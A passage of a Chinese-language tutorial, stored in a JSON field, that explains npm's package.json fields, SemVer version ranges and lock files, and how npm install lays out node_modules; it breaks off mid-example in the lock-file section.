    "explanation": "现如今，前端开发的同学已经离不开 `npm` 这个包管理工具，其优秀的包版本管理机制承载了整个繁荣发展的`NodeJS`社区，理解其内部机制非常有利于加深我们对模块开发的理解、各项前端工程化的配置以加快我们排查问题（相信不少同学收到过各种依赖问题的困扰）的速度。\n\n本文从三个角度：`package.json`、版本管理、依赖安装结合具体实例对 `npm` 的包管理机制进行了详细分析。\n\n## 一、剖析 package.json\n\n![](https://static.ecool.fun//article/e8900e97-8ea3-4f92-9f11-27ad58acfdab.awebp)\n\n在 `Node.js` 中，模块是一个库或框架，也是一个 `Node.js` 项目。`Node.js` 项目遵循模块化的架构，当我们创建了一个 `Node.js` 项目，意味着创建了一个模块，这个模块必须有一个描述文件，即 `package.json`。它是我们最常见的配置文件，但是它里面的配置你真的有详细了解过吗？配置一个合理的 `package.json` 文件直接决定着我们项目的质量，所以首先带大家分析下 `package.json` 的各项详细配置。\n\n### 1.1 必备属性\n\n`package.json` 中有非常多的属性，其中必须填写的只有两个：`name` 和 `version` ，这两个属性组成一个 `npm` 模块的唯一标识。\n\n#### npm包命名规则\n\n`name` 即模块名称，其命名时需要遵循官方的一些规范和建议：\n\n* 包名会成为模块`url`、命令行中的一个参数或者一个文件夹名称，任何非`url`安全的字符在包名中都不能使用，可以使用 `validate-npm-package-name` 包来检测包名是否合法。\n* 语义化包名，可以帮助开发者更快的找到需要的包，并且避免意外获取错误的包。\n* 若包名称中存在一些符号，将符号去除后不得与现有包名重复\n\n例如：由于`react-native`已经存在，`react.native`、`reactnative`都不可以再创建。\n\n* 如果你的包名与现有的包名太相近导致你不能发布这个包，那么推荐将这个包发布到你的作用域下。\n\n例如：用户名 `conard`，那么作用域为 `@conard`，发布的包可以是`@conard/react`。\n\n#### 查看包是否被占用\n\n`name` 是一个包的唯一标识，不得和其他包名重复，我们可以执行 `npm view packageName` 查看包是否被占用，并可以查看它的一些基本信息：\n\n![](https://static.ecool.fun//article/5ff784b8-f2dd-4112-b896-2456eba9b22a.awebp)\n\n若包名称从未被使用过，则会抛出 `404` 错误：\n\n![](https://static.ecool.fun//article/cbd6a755-8bc5-4a96-990c-db34413fc40e.awebp)\n\n另外，你还可以去 `https://www.npmjs.com/` 查询更多更详细的包信息。\n\n### 1.2描述信息\n\n#### 基本描述\n\n```\n{\n  \"description\": \"An enterprise-class UI design language and React components implementation\",\n  \"keywords\": [\n    \"ant\",\n    \"component\",\n    \"components\",\n    \"design\",\n    \"framework\",\n    \"frontend\",\n    \"react\",\n    \"react-component\",\n    \"ui\"\n  ]\n}\n\n```\n\n`description`用于添加模块的的描述信息，方便别人了解你的模块。\n\n`keywords`用于给你的模块添加关键字。\n\n当然，他们的还有一个非常重要的作用，就是利于模块检索。当你使用 `npm search` 检索模块时，会到`description` 和 `keywords` 中进行匹配。写好 `description` 和 `keywords` 有利于你的模块获得更多更精准的曝光：\n\n![](https://static.ecool.fun//article/6d19aea5-7a1a-4f6a-9b16-afae9acfcc19.awebp)\n\n#### 开发人员\n\n描述开发人员的字段有两个：`author` 和 `contributors`， `author` 指包的主要作者，一个 `author` 对应一个人。 `contributors` 指贡献者信息，一个 `contributors` 对应多个贡献者，值为数组，对人的描述可以是一个字符串，也可以是下面的结构：\n\n```\n{\n    \"name\" : \"ConardLi\",\n    \"email\" : \"lisqPersion@163.com\",\n    \"url\" : \"https://github.com/ConardLi\"\n}\n\n```\n\n#### 地址\n\n```\n{\n  \"homepage\": \"http://ant.design/\",\n  \"bugs\": {\n    \"url\": \"https://github.com/ant-design/ant-design/issues\"\n  },\n  \"repository\": {\n    \"type\": \"git\",\n    \"url\": \"https://github.com/ant-design/ant-design\"\n  },\n}\n\n```\n\n`homepage` 用于指定该模块的主页。\n\n`repository` 用于指定模块的代码仓库。\n\n![](https://static.ecool.fun//article/3432209d-21fd-46b6-9b42-890fd28e94e4.awebp)\n\n`bugs` 指定一个地址或者一个邮箱，对你的模块存在疑问的人可以到这里提出问题。\n\n### 1.3 依赖配置\n\n我们的项目可能依赖一个或多个外部依赖包，根据依赖包的不同用途，我们将他们配置在下面几个属性下：`dependencies、devDependencies、peerDependencies、bundledDependencies、optionalDependencies`。\n\n#### 配置规则\n\n在介绍几种依赖配置之前，首先我们来看一下依赖的配置规则，你看到的依赖包配置可能是下面这样的：\n\n```\n \"dependencies\": {\n      \"antd\": \"ant-design/ant-design#4.0.0-alpha.8\",\n      \"axios\": \"^1.2.0\",\n      \"test-js\": \"file:../test\",\n      \"test2-js\": \"http://cdn.com/test2-js.tar.gz\",\n      \"core-js\": \"^1.1.5\",\n }\n\n```\n\n依赖配置遵循下面几种配置规则：\n\n* `依赖包名称:VERSION`\n  + `VERSION`是一个遵循`SemVer`规范的版本号配置，`npm install` 时将到npm服务器下载符合指定版本范围的包。\n* `依赖包名称:DWONLOAD_URL`\n  + `DWONLOAD_URL` 是一个可下载的`tarball`压缩包地址，模块安装时会将这个`.tar`下载并安装到本地。\n* `依赖包名称:LOCAL_PATH`\n  + `LOCAL_PATH` 是一个本地的依赖包路径，例如 `file:../pacakges/pkgName`。适用于你在本地测试一个`npm`包，不应该将这种方法应用于线上。\n* `依赖包名称:GITHUB_URL`\n  + `GITHUB_URL` 即 `github` 的 `username/modulename` 的写法，例如：`ant-design/ant-design`，你还可以在后面指定 `tag` 和 `commit id`。\n* `依赖包名称:GIT_URL`\n  + `GIT_URL` 即我们平时clone代码库的 `git url`，其遵循以下形式：\n\n```\n<protocol>://[<user>[:<password>]@]<hostname>[:<port>][:][/]<path>[#<commit-ish> | #semver:<semver>]\n\n```\n\n其中 `protocal` 可以是以下几种形式：\n\n* `git://github.com/user/project.git#commit-ish`\n* `git+ssh://user@hostname:project.git#commit-ish`\n* `git+ssh://user@hostname/project.git#commit-ish`\n* `git+http://user@hostname/project/blah.git#commit-ish`\n* `git+https://user@hostname/project/blah.git#commit-ish`\n\n#### dependencies\n\n`dependencies` 指定了项目运行所依赖的模块，开发环境和生产环境的依赖模块都可以配置到这里，例如\n\n```\n \"dependencies\": {\n      \"lodash\": \"^4.17.13\",\n      \"moment\": \"^2.24.0\",\n }\n\n```\n\n#### devDependencies\n\n有一些包有可能你只是在开发环境中用到，例如你用于检测代码规范的 `eslint` ,用于进行测试的 `jest` ，用户使用你的包时即使不安装这些依赖也可以正常运行，反而安装他们会耗费更多的时间和资源，所以你可以把这些依赖添加到 `devDependencies` 中，这些依赖照样会在你本地进行 `npm install` 时被安装和管理，但是不会被安装到生产环境：\n\n```\n \"devDependencies\": {\n      \"jest\": \"^24.3.1\",\n      \"eslint\": \"^6.1.0\",\n }\n\n```\n\n#### peerDependencies\n\n`peerDependencies` 用于指定你正在开发的模块所依赖的版本以及用户安装的依赖包版本的兼容性。\n\n上面的说法可能有点太抽象，我们直接拿 `ant-design` 来举个例子，`ant-design` 的 `package.json` 中有如下配置：\n\n```\n  \"peerDependencies\": {\n    \"react\": \">=16.0.0\",\n    \"react-dom\": \">=16.0.0\"\n  }\n\n```\n\n当你正在开发一个系统，使用了 `ant-design` ，所以也肯定需要依赖 `React`。同时， `ant-design` 也是需要依赖 `React` 的，它要保持稳定运行所需要的 `React` 版本是`16.0.0`，而你开发时依赖的 `React` 版本是 `15.x`：\n\n这时，`ant-design` 要使用 `React`，并将其引入：\n\n```\nimport * as React from 'react';\nimport * as ReactDOM from 'react-dom';\n\n```\n\n这时取到的是宿主环境也就是你的环境中的 `React` 版本，这就可能造成一些问题。在 `npm2` 的时候，指定上面的 `peerDependencies` 将意味着强制宿主环境安装 `react@>=16.0.0和react-dom@>=16.0.0` 的版本。\n\n`npm3` 以后不会再要求 `peerDependencies` 所指定的依赖包被强制安装，相反 `npm3` 会在安装结束后检查本次安装是否正确，如果不正确会给用户打印警告提示。\n\n```\n  \"dependencies\": {\n    \"react\": \"15.6.0\",\n    \"antd\": \"^3.22.0\"\n  }\n\n```\n\n例如，我在项目中依赖了 `antd` 的最新版本，然后依赖了 `react` 的 `15.6.0`版本，在进行依赖安装时将给出以下警告：\n\n![](https://static.ecool.fun//article/520ce8a4-8c8d-4c2f-98fe-69995dca7b96.awebp)\n\n#### optionalDependencies\n\n某些场景下，依赖包可能不是强依赖的，这个依赖包的功能可有可无，当这个依赖包无法被获取到时，你希望 `npm install` 继续运行，而不会导致失败，你可以将这个依赖放到 `optionalDependencies` 中，注意 `optionalDependencies` 中的配置将会覆盖掉 `dependencies` 所以只需在一个地方进行配置。\n\n当然，引用 `optionalDependencies` 中安装的依赖时，一定要做好异常处理，否则在模块获取不到时会导致报错。\n\n#### bundledDependencies\n\n和以上几个不同，`bundledDependencies` 的值是一个数组，数组里可以指定一些模块，这些模块将在这个包发布时被一起打包。\n\n```\n  \"bundledDependencies\": [\"package1\" , \"package2\"]\n\n```\n\n### 1.4 协议\n\n```\n{\n    \"license\": \"MIT\"\n}\n\n```\n\n`license` 字段用于指定软件的开源协议，开源协议里面详尽表述了其他人获得你代码后拥有的权利，可以对你的的代码进行何种操作，何种操作又是被禁止的。同一款协议有很多变种，协议太宽松会导致作者丧失对作品的很多权利，太严格又不便于使用者使用及作品的传播，所以开源作者要考虑自己对作品想保留哪些权利，放开哪些限制。\n\n> 软件协议可分为开源和商业两类，对于商业协议，或者叫法律声明、许可协议，每个软件会有自己的一套行文，由软件作者或专门律师撰写，对于大多数人来说不必自己花时间和精力去写繁长的许可协议，选择一份广为流传的开源协议就是个不错的选择。\n\n以下就是几种主流的开源协议：\n\n![](https://static.ecool.fun//article/11756d33-70e6-457f-84cf-5b400f327898.awebp)\n\n* `MIT`：只要用户在项目副本中包含了版权声明和许可声明，他们就可以拿你的代码做任何想做的事情，你也无需承担任何责任。\n* `Apache`：类似于 `MIT`，同时还包含了贡献者向用户提供专利授权相关的条款。\n* `GPL`：修改项目代码的用户再次分发源码或二进制代码时，必须公布他的相关修改。\n\n如果你对开源协议有更详细的要求，可以到 [choosealicense.com/](https://link.juejin.cn?target=https%3A%2F%2Fchoosealicense.com%2F \"https://choosealicense.com/\") 获取更详细的开源协议说明。\n\n![](https://static.ecool.fun//article/12b98003-c3f4-4abe-81a4-a208adeba4dc.awebp)\n\n### 1.5 目录、文件相关\n\n#### 程序入口\n\n```\n{\n  \"main\": \"lib/index.js\",\n}\n\n```\n\n`main` 属性可以指定程序的主入口文件，例如，上面 `antd` 指定的模块入口 `lib/index.js` ，当我们在代码用引入 `antd` 时：`import { notification } from 'antd';` 实际上引入的就是 `lib/index.js` 中暴露出去的模块。\n\n![](https://static.ecool.fun//article/993c6e68-e157-4d36-ab04-cdefa0a293d9.awebp)\n\n#### 命令行工具入口\n\n当你的模块是一个命令行工具时，你需要为命令行工具指定一个入口，即指定你的命令名称和本地可指定文件的对应关系。如果是全局安装，npm 将会使用符号链接把可执行文件链接到 `/usr/local/bin`，如果是本地安装，会链接到 `./node_modules/.bin/`。\n\n```\n{\n    \"bin\": {\n    \"conard\": \"./bin/index.js\"\n  }\n}\n\n```\n\n例如上面的配置：当你的包安装到全局时：`npm` 会在 `/usr/local/bin`下创建一个以 `conard` 为名字的软链接，指向全局安装下来的 `conard` 包下面的 `\"./bin/index.js\"`。这时你在命令行执行 `conard` 则会调用链接到的这个js文件。\n\n> 这里不再过多展开，更多内容在我后续的命令行工具文章中会进行详细讲解。\n\n#### 发布文件配置\n\n```\n{\n    \"files\": [\n      \"dist\",\n      \"lib\",\n      \"es\"\n    ]\n}\n\n```\n\n`files` 属性用于描述你 `npm publish` 后推送到 `npm` 服务器的文件列表，如果指定文件夹，则文件夹内的所有内容都会包含进来。我们可以看到下载后的包是下面的目录结构：\n\n![](https://static.ecool.fun//article/5ceaf062-4eec-4973-860e-a4663b7f8188.awebp)\n\n> 另外，你还可以通过配置一个 `.npmignore` 文件来排除一些文件, 防止大量的垃圾文件推送到 `npm`, 规则上和你用的 `.gitignore` 是一样的。`.gitignore` 文件也可以充当`.npmignore` 文件。\n\n#### man\n\n`man` 命令是 `Linux` 下的帮助指令，通过 `man` 指令可以查看 `Linux` 中的指令帮助、配置文件帮助和编程帮助等信息。\n\n如果你的 `node.js` 模块是一个全局的命令行工具，在 `package.json` 通过 `man` 属性可以指定 `man` 命令查找的文档地址。\n\n`man` 文件必须以数字结尾，或者如果被压缩了，以 `.gz` 结尾。数字表示文件将被安装到 `man` 的哪个部分。如果 `man` 文件名称不是以模块名称开头的，安装的时候会给加上模块名称前缀。\n\n例如下面这段配置：\n\n```\n{\n  \"man\" : [\n    \"/Users/isaacs/dev/npm/cli/man/man1/npm-access.1\",\n    \"/Users/isaacs/dev/npm/cli/man/man1/npm-audit.1\"\n  ]\n}\n\n```\n\n在命令行输入 `man npm-audit` ：\n\n![](https://static.ecool.fun//article/6b0b9cea-419a-478c-9df3-76391bad5180.awebp)\n\n#### 规范项目目录\n\n一个 `node.js` 模块是基于 `CommonJS` 模块化规范实现的，严格按照 `CommonJS` 规范，模块目录下除了必须包含包描述文件 `package.json` 以外，还需要包含以下目录：\n\n* `bin`：存放可执行二进制文件的目录\n* `lib`：存放js代码的目录\n* `doc`：存放文档的目录\n* `test`：存放单元测试用例代码的目录\n* ...\n\n在模块目录中你可能没有严格按照以上结构组织或命名，你可以通过在 `package.json` 指定 `directories` 属性来指定你的目录结构和上述的规范结构的对应情况。除此之外 `directories` 属性暂时没有其他应用。\n\n```\n{\n  \"directories\": {\n    \"lib\": \"src/lib/\",\n    \"bin\": \"src/bin/\",\n    \"man\": \"src/man/\",\n    \"doc\": \"src/doc/\",\n    \"example\": \"src/example/\"\n  }\n}\n\n```\n\n> 不过官方文档表示，虽然目前这个属性没有什么重要作用，未来可能会整出一些花样出来，例如：doc 中存放的 markdown 文件、example 中存放的示例文件，可能会友好的展示出来。\n\n### 1.6 脚本配置\n\n#### script\n\n```\n{\n  \"scripts\": {\n    \"test\": \"jest --config .jest.js --no-cache\",\n    \"dist\": \"antd-tools run dist\",\n    \"compile\": \"antd-tools run compile\",\n    \"build\": \"npm run compile && npm run dist\"\n  }\n}\n\n```\n\n`scripts` 用于配置一些脚本命令的缩写，各个脚本可以互相组合使用，这些脚本可以覆盖整个项目的生命周期，配置后可使用 `npm run command` 进行调用。如果是 `npm` 关键字，则可以直接调用。例如，上面的配置制定了以下几个命令：`npm run test`、`npm run dist`、`npm run compile`、`npm run build`。\n\n#### config\n\n`config` 字段用于配置脚本中使用的环境变量，例如下面的配置，可以在脚本中使用`process.env.npm_package_config_port`进行获取。\n\n```\n{\n  \"config\" : { \"port\" : \"8080\" }\n}\n\n```\n\n### 1.7 发布配置\n\n#### preferGlobal\n\n如果你的 `node.js` 模块主要用于安装到全局的命令行工具，那么该值设置为 `true` ，当用户将该模块安装到本地时，将得到一个警告。这个配置并不会阻止用户安装，而是会提示用户防止错误使用而引发一些问题。\n\n#### private\n\n如果将 `private` 属性设置为 `true`，npm将拒绝发布它，这是为了防止一个私有模块被无意间发布出去。\n\n![](https://static.ecool.fun//article/987fa09c-3289-4642-a859-9b5c6243afbe.awebp)\n\n#### publishConfig\n\n```\n  \"publishConfig\": {\n    \"registry\": \"https://registry.npmjs.org/\"\n  },\n\n```\n\n发布模块时更详细的配置，例如你可以配置只发布某个 `tag`、配置发布到的私有 `npm` 源。更详细的配置可以参考 [npm-config](https://link.juejin.cn?target=http%3A%2F%2Fcaibaojian.com%2Fnpm%2Fmisc%2Fconfig.html \"http://caibaojian.com/npm/misc/config.html\")\n\n#### os\n\n假如你开发了一个模块，只能跑在 `darwin` 系统下，你需要保证 `windows` 用户不会安装到你的模块，从而避免发生不必要的错误。\n\n使用 `os` 属性可以帮助你完成以上的需求，你可以指定你的模块只能被安装在某些系统下，或者指定一个不能安装的系统黑名单：\n\n```\n\"os\" : [ \"darwin\", \"linux\" ]\n\"os\" : [ \"!win32\" ]\n\n```\n\n例如，我把一个测试模块指定一个系统黑名单：`\"os\" : [ \"!darwin\" ]`，当我在此系统下安装它时会爆出如下错误：\n\n![](https://static.ecool.fun//article/3d7103b1-ad74-42a1-9f50-9985dbe32978.awebp)\n\n> 在node环境下可以使用 process.platform 来判断操作系统。\n\n#### cpu\n\n和上面的 `os` 类似，我们可以用 `cpu` 属性更精准的限制用户安装环境：\n\n```\n\"cpu\" : [ \"x64\", \"ia32\" ]\n\"cpu\" : [ \"!arm\", \"!mips\" ]\n\n```\n\n> 在node环境下可以使用 process.arch 来判断 cpu 架构。\n\n## 二、剖析包版本管理机制\n\n`Nodejs`成功离不开 `npm` 优秀的依赖管理系统。在介绍整个依赖系统之前，必须要了解 `npm`如何管理依赖包的版本，本章将介绍 `npm包` 的版本发布规范、如何管理各种依赖包的版本以及一些关于包版本的最佳实践。\n\n![](https://static.ecool.fun//article/8533e786-91b7-4c53-ae0b-d2f8465f944a.awebp)\n\n### 2.1 查看npm包版本\n\n你可以执行 `npm view package version` 查看某个 `package` 的最新版本。\n\n执行 `npm view conard versions` 查看某个 `package` 在npm服务器上所有发布过的版本。\n\n![](https://static.ecool.fun//article/2ebef594-98ac-49d6-9741-f010b0c1d672.awebp)\n\n执行 `npm ls` 可查看当前仓库依赖树上所有包的版本信息。\n\n![](https://static.ecool.fun//article/27c5e82a-3e6c-4c9c-b09e-ac13fe6bb172.awebp)\n\n### 2.2 SemVer规范\n\n`npm包` 中的模块版本都需要遵循 `SemVer`规范——由 `Github` 起草的一个具有指导意义的，统一的版本号表示规则。实际上就是 `Semantic Version`（语义化版本）的缩写。\n\n> SemVer规范官网： [semver.org/](https://link.juejin.cn?target=https%3A%2F%2Fsemver.org%2F \"https://semver.org/\")\n\n#### 标准版本\n\n`SemVer`规范的标准版本号采用 `X.Y.Z` 的格式，其中 X、Y 和 Z 为非负的整数，且禁止在数字前方补零。X 是主版本号、Y 是次版本号、而 Z 为修订号。每个元素必须以数值来递增。\n\n* 主版本号(`major`)：当你做了不兼容的API 修改\n* 次版本号(`minor`)：当你做了向下兼容的功能性新增\n* 修订号(`patch`)：当你做了向下兼容的问题修正。\n\n例如：`1.9.1 -> 1.10.0 -> 1.11.0`\n\n#### 先行版本\n\n当某个版本改动比较大、并非稳定而且可能无法满足预期的兼容性需求时，你可能要先发布一个先行版本。\n\n先行版本号可以加到“主版本号.次版本号.修订号”的后面，先加上一个连接号再加上一连串以句点分隔的标识符和版本编译信息。\n\n* 内部版本(`alpha`):\n* 公测版本(`beta`):\n* 正式版本的候选版本`rc`: 即 `Release candiate`\n\n#### React的版本\n\n下面我们来看看 `React` 的历史版本：\n\n![](https://static.ecool.fun//article/de286507-db3b-4ef2-bf8b-257872fa3fa4.awebp)\n\n可见是严格按照 `SemVer` 规范来发版的：\n\n* 版本号严格按照 `主版本号.次版本号.修订号` 格式命名\n* 版本是严格递增的，：`16.8.0 -> 16.8.1 -> 16.8.2`\n* 发布重大版本或版本改动较大时，先发布`alpha`、`beta`、`rc`等先行版本\n\n#### 发布版本\n\n在修改 `npm` 包某些功能后通常需要发布一个新的版本，我们通常的做法是直接去修改 `package.json` 到指定版本。如果操作失误，很容易造成版本号混乱，我们可以借助符合 `Semver` 规范的命令来完成这一操作：\n\n* `npm version patch` : 升级修订版本号\n* `npm version minor` : 升级次版本号\n* `npm version major` : 升级主版本号\n\n### 2.3 版本工具使用\n\n在开发中肯定少不了对一些版本号的操作，如果这些版本号符合 `SemVer`规范 ，我们可以借助用于操作版本的npm包`semver`来帮助我们进行比较版本大小、提取版本信息等操作。\n\n> Npm 也使用了该工具来处理版本相关的工作。\n\n```\nnpm install semver\n\n```\n\n* 比较版本号大小\n\n```\nsemver.gt('1.2.3', '9.8.7') // false\nsemver.lt('1.2.3', '9.8.7') // true\n\n```\n\n* 判断版本号是否符合规范，返回解析后符合规范的版本号。\n\n```\nsemver.valid('1.2.3') // '1.2.3'\nsemver.valid('a.b.c') // null\n\n```\n\n* 将其他版本号强制转换成semver版本号\n\n```\nsemver.valid(semver.coerce('v2')) // '2.0.0'\nsemver.valid(semver.coerce('42.6.7.9.3-alpha')) // '42.6.7'\n\n```\n\n* 一些其他用法\n\n```\nsemver.clean('  =v1.2.3   ') // '1.2.3'\nsemver.satisfies('1.2.3', '1.x || >=2.5.0 || 5.0.0 - 7.2.3') // true\nsemver.minVersion('>=1.0.0') // '1.0.0'\n\n```\n\n以上都是semver最常见的用法，更多详细内容可以查看 semver文档：[github.com/npm/node-se…](https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnpm%2Fnode-semver \"https://github.com/npm/node-semver\")\n\n### 2.4 依赖版本管理\n\n我们经常看到，在 `package.json` 中各种依赖的不同写法：\n\n```\n  \"dependencies\": {\n    \"signale\": \"1.4.0\",\n    \"figlet\": \"*\",\n    \"react\": \"16.x\",\n    \"table\": \"~5.4.6\",\n    \"yargs\": \"^14.0.0\"\n  }\n\n```\n\n前面三个很容易理解：\n\n* `\"signale\": \"1.4.0\"`: 固定版本号\n* `\"figlet\": \"*\"`: 任意版本（`>=0.0.0`）\n* `\"react\": \"16.x\"`: 匹配主要版本（`>=16.0.0 <17.0.0`）\n* `\"react\": \"16.3.x\"`: 匹配主要版本和次要版本（`>=16.3.0 <16.4.0`）\n\n再来看看后面两个，版本号中引用了 `~` 和 `^` 符号：\n\n* `~`: 当安装依赖时获取到有新版本时，安装到 `x.y.z` 中 `z` 的最新的版本。即保持主版本号、次版本号不变的情况下，保持修订号的最新版本。\n* `^`: 当安装依赖时获取到有新版本时，安装到 `x.y.z` 中 `y` 和 `z` 都为最新版本。 即保持主版本号不变的情况下，保持次版本号、修订版本号为最新版本。\n\n在 `package.json` 文件中最常见的应该是 `\"yargs\": \"^14.0.0\"` 这种格式的 依赖, 因为我们在使用 `npm install package` 安装包时，`npm` 默认安装当前最新版本，然后在所安装的版本号前加 `^` 号。\n\n注意，当主版本号为 `0` 的情况，会被认为是一个不稳定版本，情况与上面不同：\n\n* 主版本号和次版本号都为 `0`: `^0.0.z`、`~0.0.z` 都被当作固定版本，安装依赖时均不会发生变化。\n* 主版本号为 `0`: `^0.y.z` 表现和 `~0.y.z` 相同，只保持修订号为最新版本。\n\n> 1.0.0 的版本号用于界定公共 API。当你的软件发布到了正式环境，或者有稳定的API时，就可以发布1.0.0版本了。所以，当你决定对外部发布一个正式版本的npm包时，把它的版本标为1.0.0。\n\n### 2.5 锁定依赖版本\n\n#### lock文件\n\n实际开发中，经常会因为各种依赖不一致而产生奇怪的问题，或者在某些场景下，我们不希望依赖被更新，建议在开发中使用 `package-lock.json`。\n\n锁定依赖版本意味着在我们不手动执行更新的情况下，每次安装依赖都会安装固定版本。保证整个团队使用版本号一致的依赖。\n\n每次安装固定版本，无需计算依赖版本范围，大部分场景下能大大加速依赖安装时间。\n\n> 使用 package-lock.json 要确保npm的版本在5.6以上，因为在5.0 - 5.6中间，对 package-lock.json的处理逻辑进行过几次更新，5.6版本后处理逻辑逐渐稳定。\n\n关于 `package-lock.json` 详细的结构，我们会在后面的章节进行解析。\n\n#### 定期更新依赖\n\n我们的目的是保证团队中使用的依赖一致或者稳定，而不是永远不去更新这些依赖。实际开发场景下，我们虽然不需要每次都去安装新的版本，仍然需要定时去升级依赖版本，来让我们享受依赖包升级带来的问题修复、性能提升、新特性更新。\n\n![](https://static.ecool.fun//article/d493be49-c758-4117-84c8-e0f08fae8505.awebp)\n\n使用 `npm outdated` 可以帮助我们列出有哪些还没有升级到最新版本的依赖：\n\n* 黄色表示不符合我们指定的语意化版本范围 - 不需要升级\n* 红色表示符合指定的语意化版本范围 - 需要升级\n\n执行 `npm update` 会升级所有的红色依赖。\n\n### 2.6 依赖版本选择的最佳实践\n\n#### 版本发布\n\n* 对外部发布一个正式版本的npm包时，把它的版本标为`1.0.0`。\n* 某个包版本发行后，任何修改都必须以新版本发行。\n* 版本号严格按照 `主版本号.次版本号.修订号` 格式命名\n* 版本号发布必须是严格递增的\n* 发布重大版本或版本改动较大时，先发布`alpha、beta、rc`等先行版本\n\n#### 依赖范围选择\n\n* 主工程依赖了很多子模块，都是团队成员开发的`npm`包，此时建议把版本前缀改为`~`，如果锁定的话每次子依赖更新都要对主工程的依赖进行升级，非常繁琐，如果对子依赖完全信任，直接开启`^`每次升级到最新版本。\n* 主工程跑在`docker`线上，本地还在进行子依赖开发和升级，在`docker`版本发布前要锁定所有依赖版本，确保本地子依赖发布后线上不会出问题。\n\n#### 保持依赖一致\n\n* 确保`npm`的版本在`5.6`以上，确保默认开启 `package-lock.json` 文件。\n* 由初始化成员执行 `npm inatall` 后，将 `package-lock.json` 提交到远程仓库。不要直接提交 `node_modules`到远程仓库。\n* 定期执行 `npm update` 升级依赖，并提交 `lock` 文件确保其他成员同步更新依赖，不要手动更改 `lock` 文件。\n\n#### 依赖变更\n\n* 升级依赖: 修改 `package.json`文件的依赖版本，执行 `npm install`\n* 降级依赖: 直接执行 `npm install package@version`(改动`package.json`不会对依赖进行降级)\n* 注意改动依赖后提交`lock`文件\n\n## 三、剖析 npm install 原理\n\n![](https://static.ecool.fun//article/8e7068f9-c80c-4b91-8ac8-228948590125.awebp)\n\n`npm install` 大概会经过上面的几个流程，这一章就来讲一讲各个流程的实现细节、发展以及为何要这样实现。\n\n### 3.1 嵌套结构\n\n我们都知道，执行 `npm install` 后，依赖包被安装到了 `node_modules` ，下面我们来具体了解下，`npm` 将依赖包安装到 `node_modules` 的具体机制是什么。\n\n在 `npm` 的早期版本， `npm` 处理依赖的方式简单粗暴，以递归的形式，严格按照 `package.json` 结构以及子依赖包的 `package.json` 结构将依赖安装到他们各自的 `node_modules` 中。直到有子依赖包不在依赖其他模块。\n\n举个例子，我们的模块 `my-app` 现在依赖了两个模块：`buffer`、`ignore`：\n\n```\n{\n  \"name\": \"my-app\",\n  \"dependencies\": {\n    \"buffer\": \"^5.4.3\",\n    \"ignore\": \"^5.1.4\",\n  }\n}\n\n```\n\n`ignore`是一个纯 `JS` 模块，不依赖任何其他模块，而 `buffer` 又依赖了下面两个模块：`base64-js` 、 `ieee754`。\n\n```\n{\n  \"name\": \"buffer\",\n  \"dependencies\": {\n    \"base64-js\": \"^1.0.2\",\n    \"ieee754\": \"^1.1.4\"\n  }\n}\n\n```\n\n那么，执行 `npm install` 后，得到的 `node_modules` 中模块目录结构就是下面这样的：\n\n![](https://static.ecool.fun//article/533511ce-84cf-47d9-988f-d963683bd008.awebp)\n\n这样的方式优点很明显， `node_modules` 的结构和 `package.json` 结构一一对应，层级结构明显，并且保证了每次安装目录结构都是相同的。\n\n但是，试想一下，如果你依赖的模块非常之多，你的 `node_modules` 将非常庞大，嵌套层级非常之深：\n\n![](https://static.ecool.fun//article/26de6cca-dc17-4204-81d2-e58580dbca2e.awebp)\n\n* 在不同层级的依赖中，可能引用了同一个模块，导致大量冗余。\n* 在 `Windows` 系统中，文件路径最大长度为260个字符，嵌套层级过深可能导致不可预知的问题。\n\n### 3.2 扁平结构\n\n为了解决以上问题，`NPM` 在 `3.x` 版本做了一次较大更新。其将早期的嵌套结构改为扁平结构：\n\n* 安装模块时，不管其是直接依赖还是子依赖的依赖，优先将其安装在 `node_modules` 根目录。\n\n还是上面的依赖结构，我们在执行 `npm install` 后将得到下面的目录结构：\n\n![](https://static.ecool.fun//article/c928ee1c-e110-4c91-b7d7-8f33397972f5.awebp)\n\n![](https://static.ecool.fun//article/374d9f61-af5b-4853-902c-d4e7153ea736.awebp)\n\n此时我们若在模块中又依赖了 `base64-js@1.0.1` 版本：\n\n```\n{\n  \"name\": \"my-app\",\n  \"dependencies\": {\n    \"buffer\": \"^5.4.3\",\n    \"ignore\": \"^5.1.4\",\n    \"base64-js\": \"1.0.1\",\n  }\n}\n\n```\n\n* 当安装到相同模块时，判断已安装的模块版本是否符合新模块的版本范围，如果符合则跳过，不符合则在当前模块的 `node_modules` 下安装该模块。\n\n此时，我们在执行 `npm install` 后将得到下面的目录结构：\n\n![](https://static.ecool.fun//article/61f26a7d-02c5-456a-ae85-1dbc370bffb8.awebp)\n\n![](https://static.ecool.fun//article/34bcd64c-7f23-499d-a8c8-a928f100602b.awebp)\n\n对应的，如果我们在项目代码中引用了一个模块，模块查找流程如下：\n\n* 在当前模块路径下搜索\n* 在当前模块 `node_modules` 路径下搜素\n* 在上级模块的 `node_modules` 路径下搜索\n* ...\n* 直到搜索到全局路径中的 `node_modules`\n\n假设我们又依赖了一个包 `buffer2@^5.4.3`，而它依赖了包 `base64-js@1.0.3`，则此时的安装结构是下面这样的：\n\n![](https://static.ecool.fun//article/4110c854-084a-4801-9fd6-9244d167098a.awebp)\n\n所以 `npm 3.x` 版本并未完全解决老版本的模块冗余问题，甚至还会带来新的问题。\n\n试想一下，你的APP假设没有依赖 `base64-js@1.0.1` 版本，而你同时依赖了依赖不同 `base64-js` 版本的 `buffer` 和 `buffer2`。由于在执行 `npm install` 的时候，按照 `package.json` 里依赖的顺序依次解析，则 `buffer` 和 `buffer2` 在 `package.json` 的放置顺序则决定了 `node_modules` 的依赖结构：\n\n先依赖`buffer2`：\n\n![](https://static.ecool.fun//article/cff3aa78-b64d-4948-a7c7-835b7932d007.awebp)\n\n先依赖`buffer`：\n\n![](https://static.ecool.fun//article/12d0984d-8d40-4f50-9a06-a769d95a78d3.awebp)\n\n另外，为了让开发者在安全的前提下使用最新的依赖包，我们在 `package.json` 通常只会锁定大版本，这意味着在某些依赖包小版本更新后，同样可能造成依赖结构的改动，依赖结构的不确定性可能会给程序带来不可预知的问题。\n\n### 3.3 Lock文件\n\n为了解决 `npm install` 的不确定性问题，在 `npm 5.x` 版本新增了 `package-lock.json` 文件，而安装方式还沿用了 `npm 3.x` 的扁平化的方式。\n\n`package-lock.json` 的作用是锁定依赖结构，即只要你目录下有 `package-lock.json` 文件，那么你每次执行 `npm install` 后生成的 `node_modules` 目录结构一定是完全相同的。\n\n例如，我们有如下的依赖结构：\n\n```\n{\n  \"name\": 